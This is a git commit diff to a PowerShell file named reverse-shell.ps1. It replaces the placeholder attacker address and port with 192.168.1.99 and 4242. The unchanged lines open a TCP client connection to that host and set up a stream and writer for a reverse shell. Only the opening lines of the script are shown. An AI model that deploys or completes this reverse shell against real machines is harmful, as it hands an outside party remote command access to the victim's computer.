ce90e34c5a473b77a86f821d73e0de16f36c2296
RacoonK1ng <nevio09.caputo@icloud.com>
2025-01-18 13:03:51 +0100

    Update reverse-shell.ps1

--- reverse-shell.ps1
+++ reverse-shell.ps1
@@ -1,5 +1,5 @@
-$ip = "ATTACKER_IP"  # Replace with the attacker's IP address
-$port = 1234         # Replace with the attacker's listening port
+$ip = "192.168.1.99"  # Replace with the attacker's IP address
+$port = 4242         # Replace with the attacker's listening port
 $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
 $stream = $client.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
